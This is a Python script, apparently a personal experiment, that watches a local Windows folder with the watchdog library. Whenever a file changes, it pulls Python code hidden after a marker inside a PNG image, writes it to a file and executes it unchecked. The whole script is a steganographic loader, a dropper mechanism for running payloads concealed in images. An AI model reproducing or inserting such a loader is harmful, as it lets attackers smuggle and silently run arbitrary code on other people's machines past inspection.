import time
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
import subprocess


def decode():
    def decode_image(input_image):
        with open(input_image, "rb") as image_file:
            image_data = image_file.read()
            code_start = image_data.find(b'# Hidden Python Code\n')
            if code_start != -1:
                python_code = image_data[code_start + len('# Hidden Python Code\n'):].decode()
                return python_code
            else:
                return None

    output_directory = 'C:\\Users\\Johnny Antony\\PycharmProjects\\pythonProject1\\watcher\\output_image.png'
    hidden_code = decode_image(output_directory)

    def file(hidden_code):
        with open('hidden_code.py', 'w') as file:
            file.write(hidden_code)

        result = subprocess.run(['python', 'hidden_code.py'], capture_output=True, text=True)

        # print("Execution Output:")
        print(result.stdout)

    if hidden_code is not None:
        # print("Hidden Python Code:")
        # print(hidden_code)
        file(hidden_code)
    else:
        print("No hidden code found.")


class MyHandler(FileSystemEventHandler):

    def on_modified(self, event):
        if event.event_type == 'modified':  # File is accessed
            print(f'File {event.src_path} was accessed')
            decode()

    def on_created(self, event):
        if event.event_type == 'created':  # File is created
            print(f'File {event.src_path} was created')

    def on_deleted(self, event):
        if event.event_type == 'deleted':  # File is deleted
            print(f'File {event.src_path} was deleted')

    def on_moved(self, event):
        if event.event_type == 'moved':  # File is moved
            print(f'File {event.src_path} was moved to {event.dest_path}')

    def on_opened(self, event):
        if event.event_type == 'opened':  # File is accessed
            print(f'File {event.src_path} was opened')

    def on_closed(self, event):
        if event.event_type == 'closed':  # File is accessed
            print(f'File {event.src_path} was closed')


path = 'C:\\Users\\Johnny Antony\\PycharmProjects\\pythonProject1\\watcher\\'
event_handler = MyHandler()
observer = Observer()
observer.schedule(event_handler, path, recursive=True)
observer.start()

try:
    while True:
        time.sleep(1)
finally:
    observer.stop()
    observer.join()

